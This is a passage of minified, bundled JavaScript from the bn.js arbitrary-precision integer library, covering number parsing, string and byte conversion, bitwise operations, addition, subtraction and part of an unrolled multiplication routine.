                    "object" === typeof e ? e.exports = o : t.BN = o, o.BN = o, o.wordSize = 26;
                    try {
                        s = "undefined" !== typeof window && "undefined" !== typeof window.Buffer ? window.Buffer : n(6601).Buffer
                    } catch (M) {}

                    function a(e, t) {
                        var n = e.charCodeAt(t);
                        return n >= 48 && n <= 57 ? n - 48 : n >= 65 && n <= 70 ? n - 55 : n >= 97 && n <= 102 ? n - 87 : void r(!1, "Invalid character in " + e)
                    }

                    function u(e, t, n) {
                        var r = a(e, n);
                        return n - 1 >= t && (r |= a(e, n - 1) << 4), r
                    }

                    function c(e, t, n, i) {
                        for (var o = 0, s = 0, a = Math.min(e.length, n), u = t; u < a; u++) {
                            var c = e.charCodeAt(u) - 48;
                            o *= i, s = c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c, r(c >= 0 && s < i, "Invalid character"), o += s
                        }
                        return o
                    }

                    function l(e, t) {
                        e.words = t.words, e.length = t.length, e.negative = t.negative, e.red = t.red
                    }
                    if (o.isBN = function(e) {
                            return e instanceof o || null !== e && "object" === typeof e && e.constructor.wordSize === o.wordSize && Array.isArray(e.words)
                        }, o.max = function(e, t) {
                            return e.cmp(t) > 0 ? e : t
                        }, o.min = function(e, t) {
                            return e.cmp(t) < 0 ? e : t
                        }, o.prototype._init = function(e, t, n) {
                            if ("number" === typeof e) return this._initNumber(e, t, n);
                            if ("object" === typeof e) return this._initArray(e, t, n);
                            "hex" === t && (t = 16), r(t === (0 | t) && t >= 2 && t <= 36);
                            var i = 0;
                            "-" === (e = e.toString().replace(/\s+/g, ""))[0] && (i++, this.negative = 1), i < e.length && (16 === t ? this._parseHex(e, i, n) : (this._parseBase(e, t, i), "le" === n && this._initArray(this.toArray(), t, n)))
                        }, o.prototype._initNumber = function(e, t, n) {
                            e < 0 && (this.negative = 1, e = -e), e < 67108864 ? (this.words = [67108863 & e], this.length = 1) : e < 4503599627370496 ? (this.words = [67108863 & e, e / 67108864 & 67108863], this.length = 2) : (r(e < 9007199254740992), this.words = [67108863 & e, e / 67108864 & 67108863, 1], this.length = 3), "le" === n && this._initArray(this.toArray(), t, n)
                        }, o.prototype._initArray = function(e, t, n) {
                            if (r("number" === typeof e.length), e.length <= 0) return this.words = [0], this.length = 1, this;
                            this.length = Math.ceil(e.length / 3), this.words = new Array(this.length);
                            for (var i = 0; i < this.length; i++) this.words[i] = 0;
                            var o, s, a = 0;
                            if ("be" === n)
                                for (i = e.length - 1, o = 0; i >= 0; i -= 3) s = e[i] | e[i - 1] << 8 | e[i - 2] << 16, this.words[o] |= s << a & 67108863, this.words[o + 1] = s >>> 26 - a & 67108863, (a += 24) >= 26 && (a -= 26, o++);
                            else if ("le" === n)
                                for (i = 0, o = 0; i < e.length; i += 3) s = e[i] | e[i + 1] << 8 | e[i + 2] << 16, this.words[o] |= s << a & 67108863, this.words[o + 1] = s >>> 26 - a & 67108863, (a += 24) >= 26 && (a -= 26, o++);
                            return this._strip()
                        }, o.prototype._parseHex = function(e, t, n) {
                            this.length = Math.ceil((e.length - t) / 6), this.words = new Array(this.length);
                            for (var r = 0; r < this.length; r++) this.words[r] = 0;
                            var i, o = 0,
                                s = 0;
                            if ("be" === n)
                                for (r = e.length - 1; r >= t; r -= 2) i = u(e, t, r) << o, this.words[s] |= 67108863 & i, o >= 18 ? (o -= 18, s += 1, this.words[s] |= i >>> 26) : o += 8;
                            else
                                for (r = (e.length - t) % 2 === 0 ? t + 1 : t; r < e.length; r += 2) i = u(e, t, r) << o, this.words[s] |= 67108863 & i, o >= 18 ? (o -= 18, s += 1, this.words[s] |= i >>> 26) : o += 8;
                            this._strip()
                        }, o.prototype._parseBase = function(e, t, n) {
                            this.words = [0], this.length = 1;
                            for (var r = 0, i = 1; i <= 67108863; i *= t) r++;
                            r--, i = i / t | 0;
                            for (var o = e.length - n, s = o % r, a = Math.min(o, o - s) + n, u = 0, l = n; l < a; l += r) u = c(e, l, l + r, t), this.imuln(i), this.words[0] + u < 67108864 ? this.words[0] += u : this._iaddn(u);
                            if (0 !== s) {
                                var f = 1;
                                for (u = c(e, l, e.length, t), l = 0; l < s; l++) f *= t;
                                this.imuln(f), this.words[0] + u < 67108864 ? this.words[0] += u : this._iaddn(u)
                            }
                            this._strip()
                        }, o.prototype.copy = function(e) {
                            e.words = new Array(this.length);
                            for (var t = 0; t < this.length; t++) e.words[t] = this.words[t];
                            e.length = this.length, e.negative = this.negative, e.red = this.red
                        }, o.prototype._move = function(e) {
                            l(e, this)
                        }, o.prototype.clone = function() {
                            var e = new o(null);
                            return this.copy(e), e
                        }, o.prototype._expand = function(e) {
                            for (; this.length < e;) this.words[this.length++] = 0;
                            return this
                        }, o.prototype._strip = function() {
                            for (; this.length > 1 && 0 === this.words[this.length - 1];) this.length--;
                            return this._normSign()
                        }, o.prototype._normSign = function() {
                            return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this
                        }, "undefined" !== typeof Symbol && "function" === typeof Symbol.for) try {
                        o.prototype[Symbol.for("nodejs.util.inspect.custom")] = f
                    } catch (M) {
                        o.prototype.inspect = f
                    } else o.prototype.inspect = f;

                    function f() {
                        return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">"
                    }
                    var h = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"],
                        d = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                        p = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
                    o.prototype.toString = function(e, t) {
                        var n;
                        if (t = 0 | t || 1, 16 === (e = e || 10) || "hex" === e) {
                            n = "";
                            for (var i = 0, o = 0, s = 0; s < this.length; s++) {
                                var a = this.words[s],
                                    u = (16777215 & (a << i | o)).toString(16);
                                o = a >>> 24 - i & 16777215, (i += 2) >= 26 && (i -= 26, s--), n = 0 !== o || s !== this.length - 1 ? h[6 - u.length] + u + n : u + n
                            }
                            for (0 !== o && (n = o.toString(16) + n); n.length % t !== 0;) n = "0" + n;
                            return 0 !== this.negative && (n = "-" + n), n
                        }
                        if (e === (0 | e) && e >= 2 && e <= 36) {
                            var c = d[e],
                                l = p[e];
                            n = "";
                            var f = this.clone();
                            for (f.negative = 0; !f.isZero();) {
                                var y = f.modrn(l).toString(e);
                                n = (f = f.idivn(l)).isZero() ? y + n : h[c - y.length] + y + n
                            }
                            for (this.isZero() && (n = "0" + n); n.length % t !== 0;) n = "0" + n;
                            return 0 !== this.negative && (n = "-" + n), n
                        }
                        r(!1, "Base should be between 2 and 36")
                    }, o.prototype.toNumber = function() {
                        var e = this.words[0];
                        return 2 === this.length ? e += 67108864 * this.words[1] : 3 === this.length && 1 === this.words[2] ? e += 4503599627370496 + 67108864 * this.words[1] : this.length > 2 && r(!1, "Number can only safely store up to 53 bits"), 0 !== this.negative ? -e : e
                    }, o.prototype.toJSON = function() {
                        return this.toString(16, 2)
                    }, s && (o.prototype.toBuffer = function(e, t) {
                        return this.toArrayLike(s, e, t)
                    }), o.prototype.toArray = function(e, t) {
                        return this.toArrayLike(Array, e, t)
                    };

                    function y(e, t, n) {
                        n.negative = t.negative ^ e.negative;
                        var r = e.length + t.length | 0;
                        n.length = r, r = r - 1 | 0;
                        var i = 0 | e.words[0],
                            o = 0 | t.words[0],
                            s = i * o,
                            a = 67108863 & s,
                            u = s / 67108864 | 0;
                        n.words[0] = a;
                        for (var c = 1; c < r; c++) {
                            for (var l = u >>> 26, f = 67108863 & u, h = Math.min(c, t.length - 1), d = Math.max(0, c - e.length + 1); d <= h; d++) {
                                var p = c - d | 0;
                                l += (s = (i = 0 | e.words[p]) * (o = 0 | t.words[d]) + f) / 67108864 | 0, f = 67108863 & s
                            }
                            n.words[c] = 0 | f, u = 0 | l
                        }
                        return 0 !== u ? n.words[c] = 0 | u : n.length--, n._strip()
                    }
                    o.prototype.toArrayLike = function(e, t, n) {
                        this._strip();
                        var i = this.byteLength(),
                            o = n || Math.max(1, i);
                        r(i <= o, "byte array longer than desired length"), r(o > 0, "Requested array length <= 0");
                        var s = function(e, t) {
                            return e.allocUnsafe ? e.allocUnsafe(t) : new e(t)
                        }(e, o);
                        return this["_toArrayLike" + ("le" === t ? "LE" : "BE")](s, i), s
                    }, o.prototype._toArrayLikeLE = function(e, t) {
                        for (var n = 0, r = 0, i = 0, o = 0; i < this.length; i++) {
                            var s = this.words[i] << o | r;
                            e[n++] = 255 & s, n < e.length && (e[n++] = s >> 8 & 255), n < e.length && (e[n++] = s >> 16 & 255), 6 === o ? (n < e.length && (e[n++] = s >> 24 & 255), r = 0, o = 0) : (r = s >>> 24, o += 2)
                        }
                        if (n < e.length)
                            for (e[n++] = r; n < e.length;) e[n++] = 0
                    }, o.prototype._toArrayLikeBE = function(e, t) {
                        for (var n = e.length - 1, r = 0, i = 0, o = 0; i < this.length; i++) {
                            var s = this.words[i] << o | r;
                            e[n--] = 255 & s, n >= 0 && (e[n--] = s >> 8 & 255), n >= 0 && (e[n--] = s >> 16 & 255), 6 === o ? (n >= 0 && (e[n--] = s >> 24 & 255), r = 0, o = 0) : (r = s >>> 24, o += 2)
                        }
                        if (n >= 0)
                            for (e[n--] = r; n >= 0;) e[n--] = 0
                    }, Math.clz32 ? o.prototype._countBits = function(e) {
                        return 32 - Math.clz32(e)
                    } : o.prototype._countBits = function(e) {
                        var t = e,
                            n = 0;
                        return t >= 4096 && (n += 13, t >>>= 13), t >= 64 && (n += 7, t >>>= 7), t >= 8 && (n += 4, t >>>= 4), t >= 2 && (n += 2, t >>>= 2), n + t
                    }, o.prototype._zeroBits = function(e) {
                        if (0 === e) return 26;
                        var t = e,
                            n = 0;
                        return 0 === (8191 & t) && (n += 13, t >>>= 13), 0 === (127 & t) && (n += 7, t >>>= 7), 0 === (15 & t) && (n += 4, t >>>= 4), 0 === (3 & t) && (n += 2, t >>>= 2), 0 === (1 & t) && n++, n
                    }, o.prototype.bitLength = function() {
                        var e = this.words[this.length - 1],
                            t = this._countBits(e);
                        return 26 * (this.length - 1) + t
                    }, o.prototype.zeroBits = function() {
                        if (this.isZero()) return 0;
                        for (var e = 0, t = 0; t < this.length; t++) {
                            var n = this._zeroBits(this.words[t]);
                            if (e += n, 26 !== n) break
                        }
                        return e
                    }, o.prototype.byteLength = function() {
                        return Math.ceil(this.bitLength() / 8)
                    }, o.prototype.toTwos = function(e) {
                        return 0 !== this.negative ? this.abs().inotn(e).iaddn(1) : this.clone()
                    }, o.prototype.fromTwos = function(e) {
                        return this.testn(e - 1) ? this.notn(e).iaddn(1).ineg() : this.clone()
                    }, o.prototype.isNeg = function() {
                        return 0 !== this.negative
                    }, o.prototype.neg = function() {
                        return this.clone().ineg()
                    }, o.prototype.ineg = function() {
                        return this.isZero() || (this.negative ^= 1), this
                    }, o.prototype.iuor = function(e) {
                        for (; this.length < e.length;) this.words[this.length++] = 0;
                        for (var t = 0; t < e.length; t++) this.words[t] = this.words[t] | e.words[t];
                        return this._strip()
                    }, o.prototype.ior = function(e) {
                        return r(0 === (this.negative | e.negative)), this.iuor(e)
                    }, o.prototype.or = function(e) {
                        return this.length > e.length ? this.clone().ior(e) : e.clone().ior(this)
                    }, o.prototype.uor = function(e) {
                        return this.length > e.length ? this.clone().iuor(e) : e.clone().iuor(this)
                    }, o.prototype.iuand = function(e) {
                        var t;
                        t = this.length > e.length ? e : this;
                        for (var n = 0; n < t.length; n++) this.words[n] = this.words[n] & e.words[n];
                        return this.length = t.length, this._strip()
                    }, o.prototype.iand = function(e) {
                        return r(0 === (this.negative | e.negative)), this.iuand(e)
                    }, o.prototype.and = function(e) {
                        return this.length > e.length ? this.clone().iand(e) : e.clone().iand(this)
                    }, o.prototype.uand = function(e) {
                        return this.length > e.length ? this.clone().iuand(e) : e.clone().iuand(this)
                    }, o.prototype.iuxor = function(e) {
                        var t, n;
                        this.length > e.length ? (t = this, n = e) : (t = e, n = this);
                        for (var r = 0; r < n.length; r++) this.words[r] = t.words[r] ^ n.words[r];
                        if (this !== t)
                            for (; r < t.length; r++) this.words[r] = t.words[r];
                        return this.length = t.length, this._strip()
                    }, o.prototype.ixor = function(e) {
                        return r(0 === (this.negative | e.negative)), this.iuxor(e)
                    }, o.prototype.xor = function(e) {
                        return this.length > e.length ? this.clone().ixor(e) : e.clone().ixor(this)
                    }, o.prototype.uxor = function(e) {
                        return this.length > e.length ? this.clone().iuxor(e) : e.clone().iuxor(this)
                    }, o.prototype.inotn = function(e) {
                        r("number" === typeof e && e >= 0);
                        var t = 0 | Math.ceil(e / 26),
                            n = e % 26;
                        this._expand(t), n > 0 && t--;
                        for (var i = 0; i < t; i++) this.words[i] = 67108863 & ~this.words[i];
                        return n > 0 && (this.words[i] = ~this.words[i] & 67108863 >> 26 - n), this._strip()
                    }, o.prototype.notn = function(e) {
                        return this.clone().inotn(e)
                    }, o.prototype.setn = function(e, t) {
                        r("number" === typeof e && e >= 0);
                        var n = e / 26 | 0,
                            i = e % 26;
                        return this._expand(n + 1), this.words[n] = t ? this.words[n] | 1 << i : this.words[n] & ~(1 << i), this._strip()
                    }, o.prototype.iadd = function(e) {
                        var t, n, r;
                        if (0 !== this.negative && 0 === e.negative) return this.negative = 0, t = this.isub(e), this.negative ^= 1, this._normSign();
                        if (0 === this.negative && 0 !== e.negative) return e.negative = 0, t = this.isub(e), e.negative = 1, t._normSign();
                        this.length > e.length ? (n = this, r = e) : (n = e, r = this);
                        for (var i = 0, o = 0; o < r.length; o++) t = (0 | n.words[o]) + (0 | r.words[o]) + i, this.words[o] = 67108863 & t, i = t >>> 26;
                        for (; 0 !== i && o < n.length; o++) t = (0 | n.words[o]) + i, this.words[o] = 67108863 & t, i = t >>> 26;
                        if (this.length = n.length, 0 !== i) this.words[this.length] = i, this.length++;
                        else if (n !== this)
                            for (; o < n.length; o++) this.words[o] = n.words[o];
                        return this
                    }, o.prototype.add = function(e) {
                        var t;
                        return 0 !== e.negative && 0 === this.negative ? (e.negative = 0, t = this.sub(e), e.negative ^= 1, t) : 0 === e.negative && 0 !== this.negative ? (this.negative = 0, t = e.sub(this), this.negative = 1, t) : this.length > e.length ? this.clone().iadd(e) : e.clone().iadd(this)
                    }, o.prototype.isub = function(e) {
                        if (0 !== e.negative) {
                            e.negative = 0;
                            var t = this.iadd(e);
                            return e.negative = 1, t._normSign()
                        }
                        if (0 !== this.negative) return this.negative = 0, this.iadd(e), this.negative = 1, this._normSign();
                        var n, r, i = this.cmp(e);
                        if (0 === i) return this.negative = 0, this.length = 1, this.words[0] = 0, this;
                        i > 0 ? (n = this, r = e) : (n = e, r = this);
                        for (var o = 0, s = 0; s < r.length; s++) o = (t = (0 | n.words[s]) - (0 | r.words[s]) + o) >> 26, this.words[s] = 67108863 & t;
                        for (; 0 !== o && s < n.length; s++) o = (t = (0 | n.words[s]) + o) >> 26, this.words[s] = 67108863 & t;
                        if (0 === o && s < n.length && n !== this)
                            for (; s < n.length; s++) this.words[s] = n.words[s];
                        return this.length = Math.max(this.length, s), n !== this && (this.negative = 1), this._strip()
                    }, o.prototype.sub = function(e) {
                        return this.clone().isub(e)
                    };
                    var g = function(e, t, n) {
                        var r, i, o, s = e.words,
                            a = t.words,
                            u = n.words,
                            c = 0,
                            l = 0 | s[0],
                            f = 8191 & l,
                            h = l >>> 13,
                            d = 0 | s[1],
                            p = 8191 & d,
                            y = d >>> 13,
                            g = 0 | s[2],
                            m = 8191 & g,
                            w = g >>> 13,
                            b = 0 | s[3],
                            v = 8191 & b,
                            A = b >>> 13,
                            k = 0 | s[4],
                            _ = 8191 & k,
                            E = k >>> 13,
                            S = 0 | s[5],
                            I = 8191 & S,
                            x = S >>> 13,
                            M = 0 | s[6],
                            B = 8191 & M,
                            T = M >>> 13,
                            O = 0 | s[7],
                            C = 8191 & O,
                            P = O >>> 13,
                            L = 0 | s[8],
                            N = 8191 & L,
                            R = L >>> 13,
                            D = 0 | s[9],
                            z = 8191 & D,
                            U = D >>> 13,
                            j = 0 | a[0],
                            F = 8191 & j,
                            H = j >>> 13,
                            W = 0 | a[1],
                            K = 8191 & W,
                            q = W >>> 13,
                            V = 0 | a[2],
                            Q = 8191 & V,
                            G = V >>> 13,
                            Y = 0 | a[3],
                            Z = 8191 & Y,
                            J = Y >>> 13,
                            X = 0 | a[4],
                            $ = 8191 & X,
                            ee = X >>> 13,
                            te = 0 | a[5],
                            ne = 8191 & te,
                            re = te >>> 13,
                            ie = 0 | a[6],
                            oe = 8191 & ie,
                            se = ie >>> 13,
                            ae = 0 | a[7],
                            ue = 8191 & ae,
                            ce = ae >>> 13,
                            le = 0 | a[8],
                            fe = 8191 & le,
                            he = le >>> 13,
                            de = 0 | a[9],
                            pe = 8191 & de,
                            ye = de >>> 13;
                        n.negative = e.negative ^ t.negative, n.length = 19;
                        var ge = (c + (r = Math.imul(f, F)) | 0) + ((8191 & (i = (i = Math.imul(f, H)) + Math.imul(h, F) | 0)) << 13) | 0;
                        c = ((o = Math.imul(h, H)) + (i >>> 13) | 0) + (ge >>> 26) | 0, ge &= 67108863, r = Math.imul(p, F), i = (i = Math.imul(p, H)) + Math.imul(y, F) | 0, o = Math.imul(y, H);
                        var me = (c + (r = r + Math.imul(f, K) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, q) | 0) + Math.imul(h, K) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, q) | 0) + (i >>> 13) | 0) + (me >>> 26) | 0, me &= 67108863, r = Math.imul(m, F), i = (i = Math.imul(m, H)) + Math.imul(w, F) | 0, o = Math.imul(w, H), r = r + Math.imul(p, K) | 0, i = (i = i + Math.imul(p, q) | 0) + Math.imul(y, K) | 0, o = o + Math.imul(y, q) | 0;
                        var we = (c + (r = r + Math.imul(f, Q) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, G) | 0) + Math.imul(h, Q) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, G) | 0) + (i >>> 13) | 0) + (we >>> 26) | 0, we &= 67108863, r = Math.imul(v, F), i = (i = Math.imul(v, H)) + Math.imul(A, F) | 0, o = Math.imul(A, H), r = r + Math.imul(m, K) | 0, i = (i = i + Math.imul(m, q) | 0) + Math.imul(w, K) | 0, o = o + Math.imul(w, q) | 0, r = r + Math.imul(p, Q) | 0, i = (i = i + Math.imul(p, G) | 0) + Math.imul(y, Q) | 0, o = o + Math.imul(y, G) | 0;
                        var be = (c + (r = r + Math.imul(f, Z) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, J) | 0) + Math.imul(h, Z) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, J) | 0) + (i >>> 13) | 0) + (be >>> 26) | 0, be &= 67108863, r = Math.imul(_, F), i = (i = Math.imul(_, H)) + Math.imul(E, F) | 0, o = Math.imul(E, H), r = r + Math.imul(v, K) | 0, i = (i = i + Math.imul(v, q) | 0) + Math.imul(A, K) | 0, o = o + Math.imul(A, q) | 0, r = r + Math.imul(m, Q) | 0, i = (i = i + Math.imul(m, G) | 0) + Math.imul(w, Q) | 0, o = o + Math.imul(w, G) | 0, r = r + Math.imul(p, Z) | 0, i = (i = i + Math.imul(p, J) | 0) + Math.imul(y, Z) | 0, o = o + Math.imul(y, J) | 0;
                        var ve = (c + (r = r + Math.imul(f, $) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, ee) | 0) + Math.imul(h, $) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, ee) | 0) + (i >>> 13) | 0) + (ve >>> 26) | 0, ve &= 67108863, r = Math.imul(I, F), i = (i = Math.imul(I, H)) + Math.imul(x, F) | 0, o = Math.imul(x, H), r = r + Math.imul(_, K) | 0, i = (i = i + Math.imul(_, q) | 0) + Math.imul(E, K) | 0, o = o + Math.imul(E, q) | 0, r = r + Math.imul(v, Q) | 0, i = (i = i + Math.imul(v, G) | 0) + Math.imul(A, Q) | 0, o = o + Math.imul(A, G) | 0, r = r + Math.imul(m, Z) | 0, i = (i = i + Math.imul(m, J) | 0) + Math.imul(w, Z) | 0, o = o + Math.imul(w, J) | 0, r = r + Math.imul(p, $) | 0, i = (i = i + Math.imul(p, ee) | 0) + Math.imul(y, $) | 0, o = o + Math.imul(y, ee) | 0;
                        var Ae = (c + (r = r + Math.imul(f, ne) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, re) | 0) + Math.imul(h, ne) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, re) | 0) + (i >>> 13) | 0) + (Ae >>> 26) | 0, Ae &= 67108863, r = Math.imul(B, F), i = (i = Math.imul(B, H)) + Math.imul(T, F) | 0, o = Math.imul(T, H), r = r + Math.imul(I, K) | 0, i = (i = i + Math.imul(I, q) | 0) + Math.imul(x, K) | 0, o = o + Math.imul(x, q) | 0, r = r + Math.imul(_, Q) | 0, i = (i = i + Math.imul(_, G) | 0) + Math.imul(E, Q) | 0, o = o + Math.imul(E, G) | 0, r = r + Math.imul(v, Z) | 0, i = (i = i + Math.imul(v, J) | 0) + Math.imul(A, Z) | 0, o = o + Math.imul(A, J) | 0, r = r + Math.imul(m, $) | 0, i = (i = i + Math.imul(m, ee) | 0) + Math.imul(w, $) | 0, o = o + Math.imul(w, ee) | 0, r = r + Math.imul(p, ne) | 0, i = (i = i + Math.imul(p, re) | 0) + Math.imul(y, ne) | 0, o = o + Math.imul(y, re) | 0;
                        var ke = (c + (r = r + Math.imul(f, oe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, se) | 0) + Math.imul(h, oe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, se) | 0) + (i >>> 13) | 0) + (ke >>> 26) | 0, ke &= 67108863, r = Math.imul(C, F), i = (i = Math.imul(C, H)) + Math.imul(P, F) | 0, o = Math.imul(P, H), r = r + Math.imul(B, K) | 0, i = (i = i + Math.imul(B, q) | 0) + Math.imul(T, K) | 0, o = o + Math.imul(T, q) | 0, r = r + Math.imul(I, Q) | 0, i = (i = i + Math.imul(I, G) | 0) + Math.imul(x, Q) | 0, o = o + Math.imul(x, G) | 0, r = r + Math.imul(_, Z) | 0, i = (i = i + Math.imul(_, J) | 0) + Math.imul(E, Z) | 0, o = o + Math.imul(E, J) | 0, r = r + Math.imul(v, $) | 0, i = (i = i + Math.imul(v, ee) | 0) + Math.imul(A, $) | 0, o = o + Math.imul(A, ee) | 0, r = r + Math.imul(m, ne) | 0, i = (i = i + Math.imul(m, re) | 0) + Math.imul(w, ne) | 0, o = o + Math.imul(w, re) | 0, r = r + Math.imul(p, oe) | 0, i = (i = i + Math.imul(p, se) | 0) + Math.imul(y, oe) | 0, o = o + Math.imul(y, se) | 0;
                        var _e = (c + (r = r + Math.imul(f, ue) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, ce) | 0) + Math.imul(h, ue) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, ce) | 0) + (i >>> 13) | 0) + (_e >>> 26) | 0, _e &= 67108863, r = Math.imul(N, F), i = (i = Math.imul(N, H)) + Math.imul(R, F) | 0, o = Math.imul(R, H), r = r + Math.imul(C, K) | 0, i = (i = i + Math.imul(C, q) | 0) + Math.imul(P, K) | 0, o = o + Math.imul(P, q) | 0, r = r + Math.imul(B, Q) | 0, i = (i = i + Math.imul(B, G) | 0) + Math.imul(T, Q) | 0, o = o + Math.imul(T, G) | 0, r = r + Math.imul(I, Z) | 0, i = (i = i + Math.imul(I, J) | 0) + Math.imul(x, Z) | 0, o = o + Math.imul(x, J) | 0, r = r + Math.imul(_, $) | 0, i = (i = i + Math.imul(_, ee) | 0) + Math.imul(E, $) | 0, o = o + Math.imul(E, ee) | 0, r = r + Math.imul(v, ne) | 0, i = (i = i + Math.imul(v, re) | 0) + Math.imul(A, ne) | 0, o = o + Math.imul(A, re) | 0, r = r + Math.imul(m, oe) | 0, i = (i = i + Math.imul(m, se) | 0) + Math.imul(w, oe) | 0, o = o + Math.imul(w, se) | 0, r = r + Math.imul(p, ue) | 0, i = (i = i + Math.imul(p, ce) | 0) + Math.imul(y, ue) | 0, o = o + Math.imul(y, ce) | 0;
                        var Ee = (c + (r = r + Math.imul(f, fe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, he) | 0) + Math.imul(h, fe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, he) | 0) + (i >>> 13) | 0) + (Ee >>> 26) | 0, Ee &= 67108863, r = Math.imul(z, F), i = (i = Math.imul(z, H)) + Math.imul(U, F) | 0, o = Math.imul(U, H), r = r + Math.imul(N, K) | 0, i = (i = i + Math.imul(N, q) | 0) + Math.imul(R, K) | 0, o = o + Math.imul(R, q) | 0, r = r + Math.imul(C, Q) | 0, i = (i = i + Math.imul(C, G) | 0) + Math.imul(P, Q) | 0, o = o + Math.imul(P, G) | 0, r = r + Math.imul(B, Z) | 0, i = (i = i + Math.imul(B, J) | 0) + Math.imul(T, Z) | 0, o = o + Math.imul(T, J) | 0, r = r + Math.imul(I, $) | 0, i = (i = i + Math.imul(I, ee) | 0) + Math.imul(x, $) | 0, o = o + Math.imul(x, ee) | 0, r = r + Math.imul(_, ne) | 0, i = (i = i + Math.imul(_, re) | 0) + Math.imul(E, ne) | 0, o = o + Math.imul(E, re) | 0, r = r + Math.imul(v, oe) | 0, i = (i = i + Math.imul(v, se) | 0) + Math.imul(A, oe) | 0, o = o + Math.imul(A, se) | 0, r = r + Math.imul(m, ue) | 0, i = (i = i + Math.imul(m, ce) | 0) + Math.imul(w, ue) | 0, o = o + Math.imul(w, ce) | 0, r = r + Math.imul(p, fe) | 0, i = (i = i + Math.imul(p, he) | 0) + Math.imul(y, fe) | 0, o = o + Math.imul(y, he) | 0;
                        var Se = (c + (r = r + Math.imul(f, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(f, ye) | 0) + Math.imul(h, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(h, ye) | 0) + (i >>> 13) | 0) + (Se >>> 26) | 0, Se &= 67108863, r = Math.imul(z, K), i = (i = Math.imul(z, q)) + Math.imul(U, K) | 0, o = Math.imul(U, q), r = r + Math.imul(N, Q) | 0, i = (i = i + Math.imul(N, G) | 0) + Math.imul(R, Q) | 0, o = o + Math.imul(R, G) | 0, r = r + Math.imul(C, Z) | 0, i = (i = i + Math.imul(C, J) | 0) + Math.imul(P, Z) | 0, o = o + Math.imul(P, J) | 0, r = r + Math.imul(B, $) | 0, i = (i = i + Math.imul(B, ee) | 0) + Math.imul(T, $) | 0, o = o + Math.imul(T, ee) | 0, r = r + Math.imul(I, ne) | 0, i = (i = i + Math.imul(I, re) | 0) + Math.imul(x, ne) | 0, o = o + Math.imul(x, re) | 0, r = r + Math.imul(_, oe) | 0, i = (i = i + Math.imul(_, se) | 0) + Math.imul(E, oe) | 0, o = o + Math.imul(E, se) | 0, r = r + Math.imul(v, ue) | 0, i = (i = i + Math.imul(v, ce) | 0) + Math.imul(A, ue) | 0, o = o + Math.imul(A, ce) | 0, r = r + Math.imul(m, fe) | 0, i = (i = i + Math.imul(m, he) | 0) + Math.imul(w, fe) | 0, o = o + Math.imul(w, he) | 0;
                        var Ie = (c + (r = r + Math.imul(p, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(p, ye) | 0) + Math.imul(y, pe) | 0)) << 13) | 0;
                        c = ((o = o + Math.imul(y, ye) | 0) + (i >>> 13) | 0) + (Ie >>> 26) | 0, Ie &= 67108863, r = Math.imul(z, Q), i = (i = Math.imul(z, G)) + Math.imul(U, Q) | 0, o = Math.imul(U, G), r = r + Math.imul(N, Z) | 0, i = (i = i + Math.imul(N, J) | 0) + Math.imul(R, Z) | 0, o = o + Math.imul(R, J) | 0, r = r + Math.imul(C, $) | 0, i = (i = i + Math.imul(C, ee) | 0) + Math.imul(P, $) | 0, o = o + Math.imul(P, ee) | 0, r = r + Math.imul(B, ne) | 0, i = (i = i + Math.imul(B, re) | 0) + Math.imul(T, ne) | 0, o = o + Math.imul(T, re) | 0, r = r + Math.imul(I, oe) | 0, i = (i = i + Math.imul(I, se) | 0) + Math.imul(x, oe) | 0, o = o + Math.imul(x, se) | 0, r = r + Math.imul(_, ue) | 0, i = (i = i + Math.imul(_, ce) | 0) + Math.imul(E, ue) | 0, o = o + Math.imul(E, ce) | 0, r = r + Math.imul(v, fe) | 0, i = (i = i + Math.imul(v, he) | 0) + Math.imul(A, fe) | 0, o = o + Math.imul(A, he) | 0;
                        var xe = (c + (r = r + Math.imul(m, pe) | 0) | 0) + ((8191 & (i = (i = i + Math.imul(m, ye) | 0) + Math.imul(w, pe) | 0)) << 13) | 0;
